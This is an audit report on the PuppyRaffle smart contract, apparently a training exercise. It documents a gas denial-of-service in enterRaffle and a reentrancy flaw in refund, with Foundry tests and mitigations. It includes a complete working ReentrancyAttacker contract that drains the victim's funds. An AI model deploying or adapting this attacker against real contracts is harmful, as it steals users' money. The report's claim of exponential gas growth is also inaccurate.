### [S-#] Potencial Denial Of Service (DoS) Attack when calling `enterRaffle` function due to looping on `players` array searching for duplicates. 

**Description:**
`enterRaffle` function has a `for loop` that iterates over the `players` array. This `players` array is not bounded to a certain size, which means that we can add any number of items to the list. 
The larger this array becomes, the more the gas cost increases for each call to this function, reaching a point where the gas price is so high that it makes it practically impossible to access the service, rendering the protocol useless.
Down in this section is an example of how much to gas price increase as more players are added to the `players` array.

**Impact:** The gas cost for raffle impact will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker can make the `players` array so big that no one else can enters. And also can enter a series of owned wallet addresses to guarenteeing that some of those addresses will win.  

**Proof of Concept:**
```javascript
    // AUDIT PoC
    function testDoSAttackOnEnterRaffle() public { 
        vm.txGasPrice(1);     
        uint256 playersToAdd = 99;

        // measure initial gas
        address[] memory initialPlayers = new address[](1);
        initialPlayers[0] = address(1);
        uint256 initialGas = gasleft();
        puppyRaffle.enterRaffle{ value: entranceFee }(initialPlayers);
        uint256 initialGasUsed = initialGas - gasleft();
        
        // Perform DoS
        address[] memory DoSPlayers = new address[](playersToAdd);
        for(uint256 i = 0; i<DoSPlayers.length; i++) {
            DoSPlayers[i] = address(i+2);
        }
        puppyRaffle.enterRaffle{ value: entranceFee * playersToAdd }(DoSPlayers);

        // measure final gas 
        address[] memory finalPlayers = new address[](1);
        finalPlayers[0] = address(101);
        uint256 finalInitialGas = gasleft();
        puppyRaffle.enterRaffle{ value: entranceFee }(finalPlayers);
        uint256 PostAttackGasUsed = finalInitialGas - gasleft();

        // asserts
        assert(initialGasUsed<PostAttackGasUsed);

        console.log("initial gas used:", initialGasUsed);
        console.log("post attack gas used:", PostAttackGasUsed);
        console.log("gas used incresed in a factor of aprox.", PostAttackGasUsed/initialGasUsed, " after attack");
    }
```
explanation of the above code snippet:
1. Perform a call to `enterRaffle` with just one player, and capture the gas used in this transacction on the variable `initialGasUsed`. 
2. *Perform the attack* Add a massive number of players to the raffle (in this case 99 players) to increase the size of `players`. 
3. Finally, repeat the step 1 by adding a single user and store the gas used on this transaction on the variable `postAttackGasUsed`. 
4. At the end, an assertion evaluates that gas price on the "postAttack" transaction is bigger than the initial one. And a series of logs shows how much the gas price increase. In this example, it increments in a factor of near 70 times the initial gas price. In other words, register 1 players becomes 70 times more expensive after add 100 players to the raffle. An the growth of gas price is exponential (O(c^n)) related to the length of the `players` array. 

**Recommended Mitigation:**
1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address. Also regardless the users enter the same wallet, they still have to pay for each one of such register. 
2.  Consider using a map to check for duplicates. For example, a map with the user address as key and a bool value where `true` means is already registered. This will decrease the amount of loops needed to check, because you will have to loop only on the `newPlayers` array. 

---
---
---
### [S-#] Reentrancy attack by calling `refund` function allows attacker to stole all contract's funds. 

**Description:**
`refund` function is not following the CEI principle (Checks, Effects, Interactions) because is calling a external contract before modifying the contract state. This open the door to attackers to perform a reentrancy attack by calling the `refund` function from a maliciuous contract with the `receive` function modified to make a recall to the `refund` function and empty all the contract balance. 

**Impact:** An attacker can take almost all the balance that has the contract at the moment that performs the attack. In other words, can easily stole the money of all the other `players` in the protocol. 

**Proof of Concept:**
The next contract is an example of a contract that a maliciuous actor can write to perform a Reentrancy attack to the protocol:  
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
        
contract ReentrancyAttacker {
    address private exploitableAddress;

    constructor(address victimAddress) {
        exploitableAddress = victimAddress;
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);

        exploitableAddress.call{ value: address(this).balance }(abi.encodeWithSignature("enterRaffle(address[])", players));

        (bool success, bytes memory data) = exploitableAddress.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
        (uint256 attackerIndex) = abi.decode(data, (uint256)); 

        (bool _success, bytes memory _data) = exploitableAddress.call(abi.encodeWithSignature("refund(uint256)", 10));
    }

    function fundAttacker() public payable {}

    receive() external payable {
        if(address(exploitableAddress).balance >= 1 ether) {
            (bool success, bytes memory data) = exploitableAddress.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
            (uint256 attackerIndex) = abi.decode(data, (uint256)); 
            exploitableAddress.call(abi.encodeWithSignature("refund(uint256)", attackerIndex));
        }
    }
}

```
1. When deploy the contract we pass the address of the PuppyRaffle contract (refered from now as `victim`). 
2. We modifify the contract's `receive` function logic to perform a call to the victim's `refund` function. This call will trigger a recursive effect (`refund` calls `receive`, `receive` calls `refund`, and so on) that will cause to `victim` contract to transfer almost all the money to the `ReentrancyAttacker` contract before its inner state is modified to trigger the `if` statements in charge of prevent a user to refund more money that the one payed initially.
3. Finally, we call `attack` function the ignite the explit. 

Here is also a `foundry: forge` test case that you can run to emulate the attack using the `ReentrancyAttacker` contract:
```javascript
    function test_ReentrancyAttackOnRefund() public {
        // setup attacker 
        reentrancyAttacker = new ReentrancyAttacker(address(puppyRaffle));
        reentrancyAttacker.fundAttacker{ value: entranceFee }();

        // register some users to have eth on the victim contract 
        uint256 playersToAdd = 10;
        address[] memory Players = new address[](playersToAdd);
        for(uint256 i = 0; i<Players.length; i++) {
            Players[i] = address(i+1);
        }
        puppyRaffle.enterRaffle{ value: entranceFee * playersToAdd }(Players);

        // perform the attack 
        reentrancyAttacker.attack();
        console.log(address(puppyRaffle).balance);
        console.log(address(reentrancyAttacker).balance);

        assert(address(puppyRaffle).balance==0);
        assert(address(reentrancyAttacker).balance== entranceFee * playersToAdd + entranceFee);
    }
```

**Recommended Mitigation:**
1. Adhere to the Checks-Effects-Interactions (CEI) Pattern (Primary Mitigation). 
```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // move the next line at the end of the function, so if any maliciuous "recall" occurs, the state has already being changed and this malicious call will trigger the initial requieres of this function.
-        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
+       payable(msg.sender).sendValue(entranceFee);
    }

```
2. Use Reentrancy Guards: The most robust and recommended way is to inherit from OpenZeppelin's ReentrancyGuard contract and use the nonReentrant modifier on the refund function.
